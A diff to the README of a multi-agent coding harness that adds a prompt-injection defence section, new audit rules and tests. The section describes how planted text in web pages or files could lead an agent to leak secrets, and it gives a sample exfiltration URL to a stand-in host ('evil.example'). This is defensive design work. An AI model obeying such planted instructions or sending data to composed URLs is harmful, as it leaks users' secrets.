@@ -29,7 +29,7 @@ Then type what you want built. Other entry points and options:
 .venv/bin/python -m harness --sources ./docs              # give the agents reference files to research
 .venv/bin/python -m harness --session 20261114-101500     # reopen a session: its board, trail and workspace
 .venv/bin/python -m harness --hooks examples/hooks.py     # load policy hooks
-.venv/bin/python -m unittest discover -s tests -v         # 47 tests, offline, about 7 seconds
+.venv/bin/python -m unittest discover -s tests -v         # 54 tests, offline, about 8 seconds
 ```
 
 Requirements: Linux or macOS (the memory file is locked with `fcntl`, so Windows needs WSL), Python 3.10+, and `bubblewrap` or Docker for the code sandbox (Linux has `bwrap` in every distribution; with Docker the image `python:3.12-slim` is pulled on first use). For local models, raise Ollama's context window first (its default is small): `OLLAMA_CONTEXT_LENGTH=32768 ollama serve`.
@@ -177,6 +177,7 @@ Errors that retrying cannot fix (bad credentials, invalid request, a model refus
 |---|---|---|---|
 | RES-GROUNDED | research | checked | every cited source is a file the researcher read or a page it fetched during the task (compared against the tool log; a search hit alone does not count) |
 | RES-RELEVANT | research | judged | the brief covers what the task needs; unknowns are open questions, not guesses |
+| RES-CLEAN | research | judged | the brief relays facts, not instructions: nothing a source tells the reader to do is passed on as work |
 | PLAN-MVP | plan | judged | minimum viable scope, explicit non-goals, consistent with the research |
 | PRD-IDS | prd | checked | requirement ids unique and well-formed |
 | PRD-COVERAGE | prd | judged | requirements cover the plan's scope and nothing more |
@@ -188,6 +189,7 @@ Errors that retrying cannot fix (bad credentials, invalid request, a model refus
 | IMPL-FILES | implement | checked | every file exists, is not empty (except an `__init__.py`), parses, and has no placeholder code (a TODO/FIXME comment, a function that only raises `NotImplementedError`) |
 | IMPL-TESTS | implement | checked, in the audit | the spec's test command passes and runs at least one test, **run by the harness in the sandbox** |
 | IMPL-SPEC | implement | judged | the code does what the spec and acceptance criteria say |
+| IMPL-SAFE | implement | judged | the code reaches outside the program (network, processes, `eval`/`exec`, environment variables) only where the task needs it; the harness lists every such line for the auditor from the syntax tree |
 | ANS-GROUNDED | ad-hoc answer | checked | every source cited in an answer was actually opened |
 
 Together they form a traceability chain: task → requirements → work items → files → tests. Code checks the middle of it (every requirement has a work item, every work item's files exist and parse) and observes that the suite passes. Whether the requirements cover the task and whether the code meets each acceptance criterion is the auditor's judgement, and no check ties an individual test to a requirement.
@@ -219,14 +221,26 @@ runs/<session>/workspace/      the solution that was built
 
 | Item | Where | What it does |
 |---|---|---|
-| Auto-memory | `memory.py` | Written and recalled automatically. Past research briefs and user change requests are retrieved by relevance to the new task and added to the handoff. |
+| Auto-memory | `memory.py` | Written and recalled automatically. Past research briefs (only once the auditor has passed them) and user change requests (in the user's own words) are retrieved by relevance to the new task and added to the handoff. |
 | Self-improvement | `memory.py`, `engine.py` | Every rule an agent role violates becomes a standing lesson for that role, with a hit counter, shown to it in every later session. The tests show the mechanism with the scripted team, which is written to avoid a mistake once its lesson is in the handoff: a second session needs zero gate rejections and zero audit re-runs where the first needed two of each. The effect on a real model has not been measured. |
 | Hooks | `events.py`, `examples/hooks.py` | Any function can subscribe to events. Raising `Block` from a `pre_tool` or `task_start` hook vetoes the action; hooks receive the whole tool arguments. The example enforces a token budget and a command deny-list. |
 | Gateway control, remote access | `server.py` | Token-protected HTTP API with server-sent events and a web UI: chat, a live task board (retries and audit re-opens show as they happen), and a stop button (itself a hook: it pauses the run before the next task, and `resume` continues it). |
 | Open-source and local models | `llm.py` | Any OpenAI-compatible endpoint, standard library only: Ollama, vLLM, LM Studio, OpenRouter. |
-| Security harness | `tools.py` | Generated code runs in bubblewrap or Docker: no network, no home directory, an empty environment (so no API keys), the workspace as the only writable path. File tools cannot leave the workspace (`..`, absolute paths and symlinks are resolved first). Engineers can change only the files of their own work item: the write tool refuses anything else, and whatever a command changes outside the work item is put back when the command ends. Web fetches refuse non-public addresses, including through redirects. Every agent is told to treat tool output as data, never as instructions; that is a prompt instruction, not an enforced control. |
+| Security harness | `tools.py` | Generated code runs in bubblewrap or Docker: no network, no home directory, an empty environment (so no API keys), the workspace as the only writable path. File tools cannot leave the workspace (`..`, absolute paths and symlinks are resolved first). Engineers can change only the files of their own work item: the write tool refuses anything else, and whatever a command changes outside the work item is put back when the command ends. Web fetches refuse non-public addresses, including through redirects. Prompt injection: see below. |
 
 Not done: running on a lower-level third-party harness (pi, hermes, openclaw). The harness here is its own low-level implementation.
+
+### Prompt injection
+
+Agents read text they cannot trust: web pages, reference files, files other agents wrote, command output. The defence assumes a model may obey that text and limits what obeying can achieve.
+
+- **No agent can both read untrusted text and act widely.** Only the researcher can reach the web, and it cannot write or run anything. The engineer can run code, but only in the offline sandbox, which holds no secrets.
+- **No URL the agent composed is fetched.** `web_fetch` opens a URL only if it appeared verbatim in the user's own messages, a search result or a reference file. Leaking data needs a composed URL (`https://evil.example/?d=<secret>`), so it is refused and logged. URLs in fetched pages, workspace files or text the orchestrator writes do not count, because each of those can be planted.
+- **Untrusted text is marked.** Every tool result reaches the model inside `<untrusted tool="...">` tags (a closing tag inside the text is escaped), and every prompt says what is inside is data.
+- **The audit looks for it.** RES-CLEAN checks that the brief relays no instructions; IMPL-SAFE has the auditor judge every line of generated code that reaches outside the program, from a list the harness builds, so a comment in the code cannot hide one.
+- **It does not persist.** A research brief enters memory only after the auditor has judged and passed it, and change requests are remembered in the user's own words.
+
+The test `test_a_poisoned_reference_file_cannot_make_an_obedient_agent_leak_a_secret` runs a fake model that does whatever it reads: it reads a planted secret and tries to send it out, and nothing leaves the machine.
 
 ## Design decisions
 
@@ -244,6 +258,7 @@ Not done: running on a lower-level third-party harness (pi, hermes, openclaw). T
 - **Generated solutions are standard-library Python**, because the sandbox is offline. A dependency allow-list with a pre-built image would lift this.
 - **Sandbox limits are wall-clock only under bubblewrap** (Docker adds memory and CPU caps). cgroup limits or a microVM (Firecracker, gVisor) would be the next step for hostile code.
 - **Web search scrapes DuckDuckGo's HTML page**, which needs no key but can break; a search API is a small swap in `search_web`.
+- **Prompt-injection limits.** Which of the allowed URLs an agent fetches, and its search queries, can still carry a few bits; an egress proxy would close that. The auditor's advice is stored as a lesson, and the auditor reads untrusted code. A model-based injection classifier was left out on purpose: it costs a call per tool result and is bypassed easily.
 - **Memory retrieval is lexical** (word overlap weighted by rarity). Embeddings when the store grows.
 - **No human approval between steps.** The user reviews at the end; an optional pause after the PRD would catch scope mistakes earlier and cheaper.
 - **The gateway serves one session, one request at a time, over plain HTTP.** Put it behind TLS or an SSH tunnel for real remote use.
@@ -251,4 +266,4 @@ Not done: running on a lower-level third-party harness (pi, hermes, openclaw). T
 
 ## Tests
 
-`.venv/bin/python -m unittest discover -s tests -v` runs offline. The scripted team makes one mistake of every kind, so the tests exercise every recovery path: gate rejection and in-conversation repair, crash and retry with traceback, transient-error backoff, audit re-runs from a failing test suite and from an auditor finding, incremental re-audit, exhausted re-run budget, escalation and resume, change-request cascade, a change request staying in force through later re-runs and reaching the auditor, a suite that runs no tests, a test command that cannot run, transitive blame, pause and resume, interruption and resume from disk (including a Ctrl-C while audit findings are being applied), lessons carried to a second session, grounded question answering, peer delegation, a hook veto, workspace confinement, file ownership under shell commands (including a directory swapped for a symlink), unreadable or unwritable memory, paged file reads (including a file that is one long line), the placeholder check, work-item id format, empty package markers and unparsable files, settings precedence, per-role model routing, a research revision keeping the sources it already opened, concurrent memory writes, the address guard, sandbox isolation, both model backends against local fake servers (streaming, tool-call assembly, replayed history, error classification including an overload inside an open stream and a stream that is cut or closed early), and the HTTP gateway.
+`.venv/bin/python -m unittest discover -s tests -v` runs offline. The scripted team makes one mistake of every kind, so the tests exercise every recovery path: gate rejection and in-conversation repair, crash and retry with traceback, transient-error backoff, audit re-runs from a failing test suite and from an auditor finding, incremental re-audit, exhausted re-run budget, escalation and resume, change-request cascade, a change request staying in force through later re-runs and reaching the auditor, a suite that runs no tests, a test command that cannot run, transitive blame, pause and resume, interruption and resume from disk (including a Ctrl-C while audit findings are being applied), lessons carried to a second session, grounded question answering, prompt injection (fenced tool output, the URL allow-list including the orchestrator and workspace paths, a poisoned reference file, audit-gated memory, the outward-call listing), peer delegation, a hook veto, workspace confinement, file ownership under shell commands (including a directory swapped for a symlink), unreadable or unwritable memory, paged file reads (including a file that is one long line), the placeholder check, work-item id format, empty package markers and unparsable files, settings precedence, per-role model routing, a research revision keeping the sources it already opened, concurrent memory writes, the address guard, sandbox isolation, both model backends against local fake servers (streaming, tool-call assembly, replayed history, error classification including an overload inside an open stream and a stream that is cut or closed early), and the HTTP gateway.
